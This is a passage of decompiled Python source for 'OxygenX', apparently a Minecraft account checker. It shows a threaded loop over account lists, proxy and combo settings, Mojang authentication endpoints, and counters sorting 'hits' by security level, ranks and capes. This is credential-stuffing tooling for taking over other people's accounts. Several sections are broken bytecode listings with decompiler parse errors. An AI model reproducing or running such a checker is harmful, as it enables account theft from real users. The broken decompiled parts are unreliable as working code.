            466_0  COME_FROM           436  '436'

 L. 894       466  LOAD_GLOBAL              sleep
              468  LOAD_CONST               60
              470  CALL_FUNCTION_1       1  ''
              472  POP_TOP          

 L. 895       474  POP_EXCEPT       
          476_478  JUMP_ABSOLUTE       488  'to 488'
              480  POP_EXCEPT       
              482  JUMP_BACK             0  'to 0'
              484  END_FINALLY      
              486  JUMP_BACK             0  'to 0'

Parse error at or near `POP_BLOCK' instruction at offset 224

    def resultfolder(self):
        unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
        self.folder = f"results/{unix}"
        if not path.exists('results'):
            mkdir('results')
        if not path.exists(self.folder):
            mkdir(self.folder)

    def get_announcement--- This code section failed: ---

 L. 906         0  SETUP_FINALLY       150  'to 150'

 L. 907         2  LOAD_GLOBAL              session
                4  LOAD_METHOD              get

 L. 908         6  LOAD_STR                 'https://raw.githubusercontent.com/ShadowOxygen/OxygenX/master/announcement'

 L. 907         8  CALL_METHOD_1         1  ''
               10  LOAD_ATTR                text
               12  LOAD_METHOD              split

 L. 908        14  LOAD_STR                 'Color: '

 L. 907        16  CALL_METHOD_1         1  ''
               18  STORE_FAST               'announcement'

 L. 909        20  LOAD_FAST                'announcement'
               22  LOAD_CONST               1
               24  BINARY_SUBSCR    
               26  LOAD_METHOD              lower
               28  CALL_METHOD_0         0  ''
               30  STORE_FAST               'color'

 L. 910        32  LOAD_FAST                'color'
               34  LOAD_STR                 'red\n'
               36  COMPARE_OP               ==
               38  POP_JUMP_IF_FALSE    46  'to 46'

 L. 911        40  LOAD_GLOBAL              red
               42  STORE_FAST               'color'
               44  JUMP_FORWARD        128  'to 128'
             46_0  COME_FROM            38  '38'

 L. 912        46  LOAD_FAST                'color'
               48  LOAD_STR                 'white\n'
               50  COMPARE_OP               ==
               52  POP_JUMP_IF_FALSE    60  'to 60'

 L. 913        54  LOAD_GLOBAL              white
               56  STORE_FAST               'color'
               58  JUMP_FORWARD        128  'to 128'
             60_0  COME_FROM            52  '52'

 L. 914        60  LOAD_FAST                'color'
               62  LOAD_STR                 'blue\n'
               64  COMPARE_OP               ==
               66  POP_JUMP_IF_FALSE    74  'to 74'

 L. 915        68  LOAD_GLOBAL              blue
               70  STORE_FAST               'color'
               72  JUMP_FORWARD        128  'to 128'
             74_0  COME_FROM            66  '66'

 L. 916        74  LOAD_FAST                'color'
               76  LOAD_STR                 'green\n'
               78  COMPARE_OP               ==
               80  POP_JUMP_IF_FALSE    88  'to 88'

 L. 917        82  LOAD_GLOBAL              green
               84  STORE_FAST               'color'
               86  JUMP_FORWARD        128  'to 128'
             88_0  COME_FROM            80  '80'

 L. 918        88  LOAD_FAST                'color'
               90  LOAD_STR                 'cyan\n'
               92  COMPARE_OP               ==
               94  POP_JUMP_IF_FALSE   102  'to 102'

 L. 919        96  LOAD_GLOBAL              cyan
               98  STORE_FAST               'color'
              100  JUMP_FORWARD        128  'to 128'
            102_0  COME_FROM            94  '94'

 L. 920       102  LOAD_FAST                'color'
              104  LOAD_STR                 'magenta\n'
              106  COMPARE_OP               ==
              108  POP_JUMP_IF_FALSE   116  'to 116'

 L. 921       110  LOAD_GLOBAL              magenta
              112  STORE_FAST               'color'
              114  JUMP_FORWARD        128  'to 128'
            116_0  COME_FROM           108  '108'

 L. 922       116  LOAD_FAST                'color'
              118  LOAD_STR                 'yellow\n'
              120  COMPARE_OP               ==
              122  POP_JUMP_IF_FALSE   128  'to 128'

 L. 923       124  LOAD_GLOBAL              yellow
              126  STORE_FAST               'color'
            128_0  COME_FROM           122  '122'
            128_1  COME_FROM           114  '114'
            128_2  COME_FROM           100  '100'
            128_3  COME_FROM            86  '86'
            128_4  COME_FROM            72  '72'
            128_5  COME_FROM            58  '58'
            128_6  COME_FROM            44  '44'

 L. 924       128  LOAD_FAST                'color'
              130  FORMAT_VALUE          0  ''
              132  LOAD_FAST                'announcement'
              134  LOAD_CONST               0
              136  BINARY_SUBSCR    
              138  FORMAT_VALUE          0  ''
              140  BUILD_STRING_2        2 
              142  LOAD_FAST                'self'
              144  STORE_ATTR               announcement
              146  POP_BLOCK        
              148  JUMP_FORWARD        196  'to 196'
            150_0  COME_FROM_FINALLY     0  '0'

 L. 925       150  POP_TOP          
              152  POP_TOP          
              154  POP_TOP          

 L. 926       156  LOAD_GLOBAL              OxygenX
              158  LOAD_ATTR                debug
              160  POP_JUMP_IF_FALSE   188  'to 188'

 L. 927       162  LOAD_GLOBAL              print
              164  LOAD_GLOBAL              red
              166  FORMAT_VALUE          0  ''
              168  LOAD_STR                 'Error while displaying announcement: \n'
              170  LOAD_GLOBAL              format_exc
              172  LOAD_CONST               1
              174  LOAD_CONST               ('limit',)
              176  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              178  FORMAT_VALUE          0  ''
              180  LOAD_STR                 '\n'
              182  BUILD_STRING_4        4 
              184  CALL_FUNCTION_1       1  ''
              186  POP_TOP          
            188_0  COME_FROM           160  '160'

 L. 928       188  POP_EXCEPT       
              190  LOAD_CONST               None
              192  RETURN_VALUE     
              194  END_FINALLY      
            196_0  COME_FROM           148  '148'

Parse error at or near `LOAD_CONST' instruction at offset 190

    def start_checker(self):
        if OxygenX.threads > len(self.accounts):
            OxygenX.threads = int(len(self.accounts))
        self.get_announcement()
        mainpool = ThreadPool(processes=(OxygenX.threads))
        clear()
        print(t)
        print(self.announcement)
        self.start_time = time()
        Thread(target=(self.title)).start()
        mainpool.imap_unordered(func=(self.prep), iterable=(self.accounts))
        mainpool.close()
        mainpool.join()
        symbo = f"[{Fore.GREEN}>{white}]"
        cyanz = f"[{Fore.CYAN}>{white}]"
        result = f"{white}\n\n[{Fore.YELLOW}>{white}] Results: \n\n[{green}+{white}] Hits: {Counter.hits}\n[{red}-{white}] Bad: {Counter.bad}{white}\n\n[{yellow}>{white}] Demo: {Counter.demo}\n[{green}>{white}] NFA: {Counter.nfa}\n{cyanz} SFA: {Counter.sfa}\n[{blue}>{white}] MFA: {Counter.mfa}\n[{magenta}>{white}] Unmigrated: {Counter.unfa}\n\n{symbo} NoHypixel Login accounts: {Counter.nohypixel}\n{symbo} NoMineplex Login accounts: {Counter.nomineplex}\n{symbo} Mojang capes: {Counter.mojang}\n{symbo} Optifine capes: {Counter.optifine}\n{symbo} Labymod capes: {Counter.labymod}\n{symbo} LiquidBounce capes: {Counter.liquidbounce}\n{symbo} Hypixel Ranked accounts: {Counter.hypixelrank}\n{symbo} Mineplex Ranked accounts: {Counter.mineplexrank}\n{symbo} HiveMC Ranked accounts: {Counter.hivemcrank}\n{symbo} Veltpvp Ranked accounts: {Counter.veltrank}\n{symbo} Hypixel {OxygenX.Level.hypixel_level}+ accounts: {Counter.hypixelhl}\n{symbo} Mineplex {OxygenX.Level.mineplex_level}+ accounts: {Counter.mineplexhl}\n\n{cyanz} Speed: {cyan}{round(Counter.checked / (time() - self.start_time), 2)} accounts/s\n{white}{cyanz} Total time checking: {cyan}{self.now_time()}\n\n[{magenta}x{white}] Finish checking..\n"
        self.stop_time = False
        print(result)

    def cpm_counter(self):
        while self.stop_time:
            if Counter.checked >= 1:
                now = Counter.checked
                sleep(3)
                Counter.cpm = (Counter.checked - now) * 20


def checkforupdates():
    try:
        gitversion = session.get('https://raw.githubusercontent.com/ShadowOxygen/OxygenX/master/version.txt').text
        if f"{version}\n" != gitversion:
            print(t)
            print(f"{red}Your version is outdated.")
            print(f"Your version: {version}\n")
            print(f"Latest version: {gitversion}Get latest version in the link below")
            print(f"https://github.com/ShadowOxygen/OxygenX/releases\nStarting in 5 seconds...{cyan}")
            sleep(5)
            clear()
    except:
        if OxygenX.debug:
            print(f"{red} Error while checking for updates: \n{format_exc(limit=1)}\n")


class OxygenX:
    version_check = bool(settings['OxygenX']['check_for_updates'])
    retries = int(settings['OxygenX']['retries'])
    timeout = int(settings['OxygenX']['timeout']) / 1000
    threads = int(settings['OxygenX']['threads'])
    combo_dup = bool(settings['OxygenX']['combo_duplicates'])
    proxy_dup = bool(settings['OxygenX']['proxy_duplicates'])
    emailaccess = bool(settings['OxygenX']['mail_access'])
    ranktype = bool(settings['OxygenX']['save_ranked_type'])
    print_bad = bool(settings['OxygenX']['print_bad'])
    save_bad = bool(settings['OxygenX']['save_bad'])
    debug = bool(settings['OxygenX']['debugging'])

    class Cape:
        lb = bool(settings['OxygenX']['capes']['liquidbounce'])
        optifine = bool(settings['OxygenX']['capes']['optifine'])
        laby = bool(settings['OxygenX']['capes']['labymod'])
        mojang = bool(settings['OxygenX']['capes']['mojang'])

    class Rank:
        mineplex = bool(settings['OxygenX']['rank']['mineplex'])
        hypixel = bool(settings['OxygenX']['rank']['hypixel'])
        hivemc = bool(settings['OxygenX']['rank']['hivemc'])
        veltpvp = bool(settings['OxygenX']['rank']['veltpvp'])

    class Level:
        hypixel = bool(settings['OxygenX']['level']['hypixel'])
        mineplex = bool(settings['OxygenX']['level']['mineplex'])
        hypixel_level = int(settings['OxygenX']['level']['hypixel_level'])
        mineplex_level = int(settings['OxygenX']['level']['mineplex_level'])

    class Proxy:
        proxy = bool(settings['OxygenX']['proxy']['proxy'])
        type = str(settings['OxygenX']['proxy']['proxy_type']).lower()
        lock_proxy = bool(settings['OxygenX']['proxy']['lock_proxy'])
        remove_bad_proxy = bool(settings['OxygenX']['proxy']['remove_bad_proxy'])
        proxy_remove_limit = int(settings['OxygenX']['proxy']['proxy_remove_limit']) + 1
        sfa_proxy = bool(settings['OxygenX']['proxy']['proxy_for_sfa'])
        sleep = int(settings['OxygenX']['proxy']['sleep_proxyless'])

        class API:
            use = bool(settings['OxygenX']['proxy']['api']['use'])
            api = str(settings['OxygenX']['proxy']['api']['api_link'])
            refresh = int(settings['OxygenX']['proxy']['api']['refresh_time'])


if __name__ == '__main__':
    clear = lambda : system('cls' if name == 'nt' else 'clear')
    init()
    session = Session()
    lock = Lock()
    veltrankz = compile('<h2 style=\\"color: .*\\">(.*)</h2>')
    rankhv = compile('class=\\"rank.*\\">(.*)<')
    levelmp = compile('>Level (.*)</b>')
    rankmp = compile('class=\\"www-mp-rank\\".*>(.*)</span>')
    yellow = Fore.LIGHTYELLOW_EX
    red = Fore.LIGHTRED_EX
    green = Fore.LIGHTGREEN_EX
    cyan = Fore.LIGHTCYAN_EX
    blue = Fore.LIGHTBLUE_EX
    white = Fore.LIGHTWHITE_EX
    magenta = Fore.LIGHTMAGENTA_EX
    agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36'
    scraper = create_scraper(sess=(Session()), browser={'custom': agent})
    mailheaders = {'user-agent': agent}
    jsonheaders = {'Content-Type':'application/json',  'Pragma':'no-cache'}
    user_url = 'https://api.mojang.com/profiles/minecraft'
    auth_mc = 'https://authserver.mojang.com/authenticate'
    sfa_url = 'https://api.mojang.com/user/security/challenges'
    charz = ['@', '!', '#', '$', '%', '^', '&', '*', ')', '(', '-', '}', '{', ']', '"', '+', '=', '?', '/',
     '.', '>', ',', '<', '`', "'", '~', '[', '\\', ' ']
    version = '0.8'
    set_title(f"OxygenX-{version} | by ShadowOxygen")
    t = f"{cyan}________                                     ____  ___\n\\_____  \\ ___  ______.__. ____   ____   ____ \\   \\/  /\n /   |   \\\\  \\/  <   |  |/ ___\\_/ __ \\ /    \\ \\     /\n/    |    \\>    < \\___  / /_/  >  ___/|   |  \\/     \\\n\\_______  /__/\\_ \\/ ____\\___  / \\___  >___|  /___/\\  \\\n        \\/      \\/\\/   /_____/      \\/     \\/      \\_/\n\n"
    if OxygenX.version_check:
        checkforupdates()
    Main()